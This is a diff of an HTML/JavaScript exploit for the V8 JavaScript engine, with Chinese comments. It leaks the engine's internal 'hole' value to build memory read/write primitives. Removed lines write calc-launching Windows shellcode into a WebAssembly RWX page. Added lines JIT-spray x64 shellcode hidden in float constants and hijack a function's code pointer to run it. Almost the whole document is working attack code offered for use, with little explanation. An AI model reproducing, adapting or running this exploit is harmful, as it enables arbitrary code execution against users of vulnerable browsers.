@@ -1,5 +1,5 @@
 <script>
-  const FIXED_ARRAY_HEADER_SIZE = 8n;
+    const FIXED_ARRAY_HEADER_SIZE = 8n;
   
   var buf = new ArrayBuffer(16);
   var f64 = new Float64Array(buf);
@@ -65,6 +65,81 @@
   return "0x"+i.toString(16).padStart(16,"0");
   }
   
+  const foo = ()=>
+  {
+      return [
+          1.0,
+          1.97128800932264e-246,
+          1.9710251538487089e-246,//占位1 20
+  1.9535165331756856e-246,
+  1.9711831786218553e-246,
+  1.9711302582276649e-246,//mov rdx,rdx+60h，这一行后面加一个mov rdx,rdx+18h
+  1.971182386370243e-246,//增加完毕
+  1.9711824204694007e-246,//替换qword from dword
+  1.971182625597146e-246,
+  1.9711062190503973e-246,
+  1.9844872658808452e-246,
+  1.9710442338776101e-246,//占位2 200
+  1.9346517240445797e-246,
+  1.9539187092919419e-246,//占位3 240
+  1.9398291100944961e-246,
+  1.9889043320213015e-246,
+  5.4347192807448249e-232,//需要更换跳转到+3的位置 300
+  5.5483866078232455e-232,//test rax, rax 占位4 323
+  5.4347193054904659e-232,
+  5.5483858407041602e-232,
+  5.548386599938718e-232,
+  5.5483852580972086e-232,
+  5.5483866085489296e-232,
+  5.5483866082450352e-232,//占位5替换指令 test   rcx,rcx 461
+  5.4347192989761578e-232,
+  5.5483866082673696e-232,
+  5.5483865052825693e-232,
+  5.5929115874408499e-232,
+  5.5483869437399541e-232,
+  5.5483850365737534e-232,
+  5.548386607845941e-232,
+  5.5483866055903481e-232,//占位6替换指令：622 cmp al,ah
+  5.5483866055790415e-232,
+  5.5479675990708206e-232,
+  5.5483866086060441e-232,//占位7：691
+  5.6360051602057723e-232,
+  5.5483866055757255e-232,
+  5.5483853060875066e-232,
+  5.5485814548559491e-232,
+  5.5481638823537202e-232,
+  5.5483852101069105e-232,
+  5.5483873667057662e-232,
+  5.548386503033024e-232,
+  5.5482136635123504e-232,
+  5.5482200888855405e-232,
+  5.5056845587187283e-232,
+  5.4993936985335533e-232,
+  5.5057579849776769e-232,
+  5.5483865996697425e-232,
+  5.5487288654373309e-232,//占位8 1059
+  5.548387392950241e-232,
+  5.5483866079393109e-232,
+  5.5479425928198922e-232,// lea     rcx,[rbp+0x57a]
+  5.5483866055757276e-232,
+  5.5479429440804607e-232,
+  5.5412087282453567e-232,
+  5.5483866055884766e-232,
+  5.5482086832973947e-232,
+  5.5587464282218089e-232,
+  5.4667737614685567e-232,
+  5.5483856568047451e-232,//占位9 1289
+  5.5480699333653622e-232,//占位10 
+  5.5482848842675359e-232,
+  5.6065483607039769e-232,
+  5.5483866088298074e-232,//mov movsxd替换 1381
+  9.5545979395580963e-307
+      ];
+  }
+  for (let i = 0; i < 0x10000; i++) {
+      foo();foo();foo();foo();
+  }
+  const f_x = () => 123;
   
   var arr_buf = new ArrayBuffer(8);
   var f64_arr = new Float64Array(arr_buf);
@@ -76,7 +151,7 @@
   }
   
   function itof(i) {
-      b64_arr[0] = BigInt(i);
+      b64_arr[0] = i;
       return f64_arr[0];
   }
   
@@ -241,13 +316,8 @@
       for(let i = 0; i < 0x2000000; i++) {
           leak_stuff(false);
       }
-      try{
-        gc_minor();
-      gc_major();
-      }catch(error){
-        //alert(error.message);
-      }
-      
+      // gc_minor();
+      // gc_major();
       
       let leaks = leak_stuff(true);
       //%DebugPrint(leaks);
@@ -313,41 +383,44 @@
   //*/
   function pwn() {
   
-    
+      var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
+      var wasmModule = new WebAssembly.Module(wasmCode);
+      var wasmInstance = new WebAssembly.Instance(wasmModule, {});
+      var f = wasmInstance.exports.main;
+  
       var buf1 = new ArrayBuffer(0x200);
       var dataview1 = new DataView(buf1);
   
       the.hole = leak_hole();
-      alert(the.hole);
+      // console.log(the.hole);
       install_primitives();
   
-      
-      let buf_addr = addr_of(buf1) & 0xffffffffn;;
-      // alert("[+]buf_addr : " + hex(buf_addr));
-      var backing_store = buf_addr+0x14n;
-      // alert("[+]backing_store : " + hex(backing_store));
-    
-      var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,139,128,128,128,0,1,133,128,128,128,0,0,65,255,7,11]);
-      // // var wasmCode1 = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
-  
-      var wasmModule = new WebAssembly.Module(wasmCode);
-      // // %SystemBreak();
-      // // wasmModule = new WebAssembly.Module(wasmCode1)
-      var wasmInstance = new WebAssembly.Instance(wasmModule, {});
-      var f = wasmInstance.exports.main;
-  
       let instance_addr = addr_of(wasmInstance);
-      // // // %DebugPrint(buf1);
-      // alert("[+]wasm instance addr : " + hex(instance_addr));
-      let rwx_addr = v8_read64(instance_addr-1n+0x40n) & 0xffffffffn;
-      
-      v8_write64(backing_store,rwx_addr);
-      var shellcode = [0x89,0xe5,0x83,0xec,0x20,0x31,0xdb,0x64,0x8b,0x5b,0x30,0x8b,0x5b,0x0c,0x8b,0x5b,0x1c,0x8b,0x1b,0x8b,0x1b,0x8b,0x43,0x08,0x89,0x45,0xfc,0x8b,0x58,0x3c,0x01,0xc3,0x8b,0x5b,0x78,0x01,0xc3,0x8b,0x7b,0x20,0x01,0xc7,0x89,0x7d,0xf8,0x8b,0x4b,0x24,0x01,0xc1,0x89,0x4d,0xf4,0x8b,0x53,0x1c,0x01,0xc2,0x89,0x55,0xf0,0x8b,0x53,0x14,0x89,0x55,0xec,0xeb,0x32,0x31,0xc0,0x8b,0x55,0xec,0x8b,0x7d,0xf8,0x8b,0x75,0x18,0x31,0xc9,0xfc,0x8b,0x3c,0x87,0x03,0x7d,0xfc,0x66,0x83,0xc1,0x08,0xf3,0xa6,0x74,0x05,0x40,0x39,0xd0,0x72,0xe4,0x8b,0x4d,0xf4,0x8b,0x55,0xf0,0x66,0x8b,0x04,0x41,0x8b,0x04,0x82,0x03,0x45,0xfc,0xc3,0xba,0x78,0x78,0x65,0x63,0xc1,0xea,0x08,0x52,0x68,0x57,0x69,0x6e,0x45,0x89,0x65,0x18,0xe8,0xb8,0xff,0xff,0xff,0x31,0xc9,0x51,0x68,0x2e,0x65,0x78,0x65,0x68,0x63,0x61,0x6c,0x63,0x89,0xe3,0x41,0x51,0x53,0xff,0xd0,0x31,0xc9,0xb9,0x01,0x65,0x73,0x73,0xc1,0xe9,0x08,0x51,0x68,0x50,0x72,0x6f,0x63,0x68,0x45,0x78,0x69,0x74,0x89,0x65,0x18,0xe8,0x87,0xff,0xff,0xff,0x31,0xd2,0x52,0xff,0xd0];
-      for(var i = 0; i < shellcode.length; i++) {
-          dataview1.setUint8(i, shellcode[i], true);
-      }
-      // alert("[+]rwx addr : " + hex(rwx_addr));
-      f();
+      // %DebugPrint(buf1);
+      console.log("[+]wasm instance addr : " + hex(instance_addr));
+      let rwx_addr = v8_read64(instance_addr-1n+0x60n);
+      console.log("[+]rwx addr : " + hex(rwx_addr));
+      let buf_addr = addr_of(buf1);
+      console.log("[+]buf_addr : " + hex(buf_addr));
+      var foo_addr = addr_of(foo);
+  
+      console.log("[+]foo addr :" + hex(foo_addr));
+      var code_addr = v8_read64(foo_addr+0x18n) & 0xffffffffn;
+      console.log("[+]code addr : " + hex(code_addr));
+      // %SystemBreak();
+  
+      var jit_addr = v8_read64(code_addr+0x7n);
+      console.log("[+]jit code addr : " + hex(jit_addr));
+      var f_x_addr = addr_of(f_x);
+      console.log("[+]f_x_addr : " + hex(f_x_addr));
+      var f_x_code_addr = v8_read64(f_x_addr+0x18n) & 0xffffffffn;
+      console.log("[+]f_x_code_addr : " + hex(f_x_code_addr));
+  
+      v8_write64(f_x_code_addr+0x7n+0x8n,jit_addr+0xb3n+0x6n);
+      // %DebugPrint(f_x);
+      var test_sc = [0xceb90f0e48348fc,0xceb909090909090,0xceb515250415141,0xceb9090d2314856,0xceb9090d2314856,0xceb9060528b4865,0xceb909020528b48,0xceb909050728b48,0xceb904a4ab70f48,0xcebc03148c9314d,0xceb909090613cac,0xceb0dc9c141202c,0xceb52ebe2c10141,0xceb20528b485141,0xcebd001483c428b,0xceb00000088808b,0xceb906274c08548,0xceb909050d00148,0xceb90909018488b,0xceb909020408b44,0xceb9051e3d00149,0xceb909090c9ff48,0xceb909088348b41,0xcebc9314dd60148,0xceb9090acc03148,0xceb90900dc9c141,0xceb909090c10141,0xceb9090ee75e038,0xceb9008244c034c,0xceb58d375d13945,0xceb909024408b44,0xceb909090d00149,0xceb90480c8b4166,0xceb90901c408b44,0xceb909090d00149,0xceb909088048b41,0xceb905841d00148,0xceb905a595e5841,0xceb5a4159415841,0xceb524120ec8348,0xceb5a594158e0ff,0xceb909090128b48,0xceb90ffffff67e9,0xceb9090d231485d,0xceb909090c2ff48,0xceb9090714d8d48,0xceb909070c18348,0xceb909020c18348,0xceb876f8b31ba41,0xceb90909090d5ff,0xceb9056a2b5f0bb,0xceb9dbd95a6ba41,0xceb28c48348d5ff,0xceb9090047c063c,0xceb900275e0fb80,0xceb906f721347bb,0xcebda894159006a,0xceb906c618bd5ff,0xceb909090902e8b,0xceb909090906678];
+      alert("target : " + hex(jit_addr+0xb3n+0x6n));
+      f_x();
   }
   pwn();
   </script>
